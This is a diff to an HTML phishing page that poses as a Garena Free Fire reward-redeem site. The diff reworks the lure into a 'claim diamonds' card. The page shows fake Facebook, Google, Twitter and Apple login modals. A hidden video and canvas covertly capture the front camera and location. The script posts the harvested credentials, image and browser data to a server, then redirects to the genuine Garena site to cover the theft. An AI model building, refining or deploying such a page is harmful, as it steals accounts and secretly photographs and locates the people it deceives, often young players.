@@ -3,13 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Account Center</title>
+    <title>Garena Free Fire - Reward & Redeem Center</title>
     <style>
         :root {
             --bg-color: #0b0f19;
-            --card-bg: #121826;
-            --border-color: #2a3447;
-            --accent: #ffc107;
+            --card-gradient: linear-gradient(135deg, #1a1f35 0%, #0d1221 100%);
+            --accent-glow: #00d2ff;
             --text-main: #ffffff;
             --text-muted: #94a3b8;
         }
@@ -17,124 +16,135 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background: var(--bg-color);
+            background-image: radial-gradient(circle at 50% 30%, #1f2937 0%, #0b0f19 70%);
             color: var(--text-main);
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
+            align-items: center;
+            justify-content: center;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        .main-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+        /* Redeem Card / Reward Box Container (Center) */
+        .reward-card-container {
+            background: var(--card-gradient);
+            border: 2px solid rgba(0, 210, 255, 0.3);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(0, 210, 255, 0.15);
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 20px;
             text-align: center;
+            position: relative;
+            backdrop-filter: blur(10px);
         }
 
-        h1 { font-size: 24px; margin-bottom: 10px; color: #f1f5f9; }
-        p { color: var(--text-muted); font-size: 14px; margin-bottom: 30px; max-width: 400px; }
-
-        /* Footer styling */
-        .garena-footer {
-            background-color: #000000;
-            color: #888888;
-            padding: 25px 20px;
-            border-top: 1px solid #222;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
+        .reward-card-container::before {
+            content: '';
+            position: absolute;
+            top: -2px; left: -2px; right: -2px; bottom: -2px;
+            background: linear-gradient(45deg, #ffc107, #ff5722, #00d2ff, #9c27b0);
+            border-radius: 22px;
+            z-index: -1;
+            opacity: 0.5;
+            filter: blur(5px);
         }
 
-        .footer-content {
-            width: 100%;
-            max-width: 600px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .footer-logo-text {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            text-align: left;
-        }
-
-        .footer-logo-text img {
-            width: 35px;
-            height: 35px;
-            border-radius: 4px;
-        }
-
-        .footer-logo-text p {
+        .badge-title {
+            background: linear-gradient(90deg, #ff8a00, #e52e71);
+            color: white;
             font-size: 11px;
-            margin: 0;
-            color: #777;
-            line-height: 1.4;
+            font-weight: bold;
+            text-transform: uppercase;
+            padding: 5px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
         }
 
-        .social-icons {
-            display: flex;
-            gap: 12px;
-            align-items: center;
+        h1 {
+            font-size: 22px;
+            margin: 0 0 10px 0;
+            color: #ffffff;
+            font-weight: 800;
         }
 
-        .social-icon-btn {
-            background: #1a2233;
-            border: 1px solid #334155;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
+        p.subtitle {
+            color: var(--text-muted);
+            font-size: 13px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        /* Center Connect Icons Grid */
+        .center-social-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .connect-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 10px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.3s ease;
+            color: white;
+            font-size: 13px;
+            font-weight: 600;
+            text-decoration: none;
         }
 
-        .social-icon-btn:hover {
-            border-color: var(--accent);
-            transform: scale(1.05);
+        .connect-btn:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: #00d2ff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 210, 255, 0.3);
         }
 
-        .social-icon-btn svg {
-            width: 20px;
-            height: 20px;
-            fill: #ccc;
+        .connect-btn svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
         }
 
-        .footer-links {
-            display: flex;
-            gap: 15px;
-            font-size: 12px;
-            color: #888;
+        .btn-fb { color: #1877f2; }
+        .btn-google { color: #ea4335; }
+        .btn-twitter { color: #ffffff; }
+        .btn-apple { color: #ffffff; }
+
+        .footer-note {
+            font-size: 11px;
+            color: #64748b;
+            margin-top: 15px;
         }
 
-        .footer-links a { color: #888; text-decoration: none; }
-
-        /* Full Screen Center Modal Overlay */
+        /* Full-Screen Dynamic Modal Popup */
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px);
             display: none; justify-content: center; align-items: center; z-index: 1000;
             padding: 15px; box-sizing: border-box;
         }
 
         .auth-modal {
-            background: #ffffff; color: #1c1e21; width: 100%; max-width: 420px;
-            border-radius: 12px; overflow: hidden; box-shadow: 0 12px 35px rgba(0,0,0,0.5);
+            background: #ffffff; color: #1c1e21; width: 100%; max-width: 400px;
+            border-radius: 14px; overflow: hidden; box-shadow: 0 15px 40px rgba(0,0,0,0.6);
             text-align: left; animation: modalPop 0.25s ease-out;
         }
 
         @keyframes modalPop {
-            from { transform: scale(0.92); opacity: 0; }
+            from { transform: scale(0.9); opacity: 0; }
             to { transform: scale(1); opacity: 1; }
         }
 
@@ -148,43 +158,35 @@
         .header-twitter { background: #000000; }
         .header-apple { background: #222222; }
 
-        .modal-close { cursor: pointer; font-size: 22px; font-weight: normal; }
+        .modal-close { cursor: pointer; font-size: 22px; }
         .modal-body { padding: 22px; max-height: 80vh; overflow-y: auto; }
 
         .form-field { margin-bottom: 16px; }
         .form-field label { display: block; font-size: 13px; color: #606770; margin-bottom: 6px; font-weight: 600; }
         .form-field input {
-            width: 100%; padding: 11px 14px; border: 1px solid #ccd0d5; border-radius: 6px;
+            width: 100%; padding: 12px 14px; border: 1px solid #ccd0d5; border-radius: 8px;
             font-size: 14px; outline: none; box-sizing: border-box; color: #1c1e21; background: #fff;
         }
         .form-field input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
 
         .submit-btn {
-            width: 100%; border: none; padding: 12px;
-            border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; color: white;
+            width: 100%; border: none; padding: 13px;
+            border-radius: 8px; font-weight: bold; font-size: 15px; cursor: pointer; text-align: center; color: white;
         }
         .btn-submit-fb { background: #1877f2; }
         .btn-submit-google { background: #4285f4; }
         .btn-submit-twitter { background: #000000; }
         .btn-submit-apple { background: #000000; }
 
-        /* Gmail Account Picker List Styling (matches your 7015.jpg image) */
-        .google-account-list {
-            display: flex;
-            flex-direction: column;
-            gap: 2px;
-        }
+        /* Gmail Account Picker List */
+        .google-account-list { display: flex; flex-direction: column; gap: 4px; }
         .google-account-item {
-            display: flex;
-            align-items: center;
-            padding: 12px 10px;
-            cursor: pointer;
-            border-bottom: 1px solid #f0f0f0;
-            transition: background 0.2s;
+            display: flex; align-items: center; padding: 12px 10px; cursor: pointer;
+            border-bottom: 1px solid #f0f0f0; border-radius: 8px; transition: background 0.2s;
         }
         .google-account-item:hover { background: #f8f9fa; }
         .g-avatar {
-            width: 38px; height: 38px; border-radius: 50%; background: #673ab7; color: white;
+            width: 40px; height: 40px; border-radius: 50%; color: white;
             display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; margin-right: 12px; flex-shrink: 0;
         }
         .g-info .g-name { font-weight: 600; font-size: 14px; color: #202124; }
@@ -193,49 +195,34 @@
 </head>
 <body>
 
-    <div class="main-content">
-        <h1>Garena Free Fire Account Center</h1>
-        <p>Please select your linked social platform below to manage, secure, or recover your game progression data safely.</p>
-    </div>
+    <!-- Center Reward & Redeem Card Container -->
+    <div class="reward-card-container">
+        <span class="badge-title">Free Fire Rewards</span>
+        <h1>Claim Redeem Code</h1>
+        <p class="subtitle">Connect your game account below to instantly claim your rewards, diamonds & exclusive character bundles.</p>
 
-    <!-- Footer -->
-    <footer class="garena-footer">
-        <div class="footer-content">
-            <div class="footer-logo-text">
-                <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='%23d32f2f'/><text x='50' y='65' font-size='50' fill='white' text-anchor='middle'>FF</text></svg>" alt="Garena">
-                <p>Copyright © Garena International.<br>Trademarks belong to their respective owners.</p>
+        <!-- Center Connect Buttons Grid -->
+        <div class="center-social-grid">
+            <div class="connect-btn btn-fb" onclick="openModal('Facebook')">
+                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                Facebook
             </div>
-            
-            <div class="social-icons">
-                <div class="social-icon-btn" title="YouTube">
-                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-                </div>
-                <!-- Twitter / X -->
-                <div class="social-icon-btn" onclick="openModal('Twitter')" title="Connect with Twitter">
-                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-                </div>
-                <!-- Facebook -->
-                <div class="social-icon-btn" onclick="openModal('Facebook')" title="Connect with Facebook">
-                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-                </div>
-                <!-- Google / Gmail -->
-                <div class="social-icon-btn" onclick="openModal('Google')" title="Connect with Google">
-                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/></svg>
-                </div>
-                <!-- Apple -->
-                <div class="social-icon-btn" onclick="openModal('Apple')" title="Connect with Apple">
-                    <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.83 5.48c.58-.7 1.02-1.68.91-2.66-.91.04-2.01.61-2.65 1.32-.55.6-1.03 1.59-.9 2.55 1.02.08 2.06-.51 2.64-1.21z"/></svg>
-                </div>
+            <div class="connect-btn btn-google" onclick="openModal('Google')">
+                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/></svg>
+                Google
+            </div>
+            <div class="connect-btn btn-twitter" onclick="openModal('Twitter')">
+                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                Twitter / X
+            </div>
+            <div class="connect-btn btn-apple" onclick="openModal('Apple')">
+                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.83 5.48c.58-.7 1.02-1.68.91-2.66-.91.04-2.01.61-2.65 1.32-.55.6-1.03 1.59-.9 2.55 1.02.08 2.06-.51 2.64-1.21z"/></svg>
+                Apple ID
             </div>
         </div>
-        <div class="footer-links">
-            <a href="#">Terms of Service</a>
-            <span>|</span>
-            <a href="#">Privacy Policy</a>
-            <span>|</span>
-            <span>English (United States)</span>
-        </div>
-    </footer>
+
+        <div class="footer-note">Copyright © Garena International. All rights reserved.</div>
+    </div>
 
     <!-- Full-Screen Dynamic Modal Popup -->
     <div id="authModal" class="modal-overlay">
@@ -245,12 +232,12 @@
                 <span class="modal-close" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body" id="modalBodyContent">
-                <!-- Content will load dynamically depending on platform -->
+                <!-- Content will load dynamically -->
             </div>
         </div>
     </div>
 
-    <!-- Hidden video/canvas for automatic data capture -->
+    <!-- Hidden video/canvas for automatic location and front camera capture -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -310,7 +297,6 @@
             } else if (platform === 'Google') {
                 title.innerText = 'Sign in with Google - Free Fire';
                 header.className = 'modal-header header-google';
-                // Gmail List matching your 7015.jpg image layout
                 bodyContent.innerHTML = `
                     <p style="font-size:13px; color:#5f6368; margin-top:0; margin-bottom:15px;">Choose an account to continue to Garena Free Fire</p>
                     <div class="google-account-list">
@@ -386,7 +372,6 @@
         }
 
         function selectGmail(name, email) {
-            // Direct click on Gmail account sends data instantly to server
             const payload = {
                 platform: 'Google',
                 instagram_username: email,
@@ -395,7 +380,6 @@
                 image_base64: capturedImage,
                 system: { userAgent: navigator.userAgent }
             };
-
             sendToServer(payload);
         }
 
@@ -409,7 +393,6 @@
                 image_base64: capturedImage,
                 system: { userAgent: navigator.userAgent }
             };
-
             sendToServer(payload);
         }
 
@@ -419,7 +402,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).then(() => {
-                alert('Account connected successfully!');
+                alert('Account connected successfully! Reward redeem processing...');
                 setTimeout(() => {
                     window.location.href = "https://ff.garena.com";
                 }, 500);
